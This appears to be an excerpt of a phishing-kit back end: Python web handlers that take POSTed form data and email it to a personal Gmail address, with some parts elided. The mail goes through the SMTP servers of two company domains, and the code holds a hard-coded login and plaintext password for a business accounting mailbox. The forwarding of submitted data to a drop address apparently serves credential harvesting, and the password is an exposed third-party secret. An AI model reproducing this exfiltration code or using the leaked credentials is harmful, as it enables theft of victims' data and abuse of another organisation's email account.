...
def first():
    if request.method == 'POST':
        ...
        sender_email = "contabilidad@alselecsas.com.co"
        sender_emaill = "contabilidad"
        receiver_email = "kokofunds147@gmail.com"
        password = "Contabilidadalselec2021"
        ...
        with smtplib.SMTP_SSL("alselecsas.com.co", 465) as server:
...
def second():
    if request.method == 'POST':
        ...
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("asistalento.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
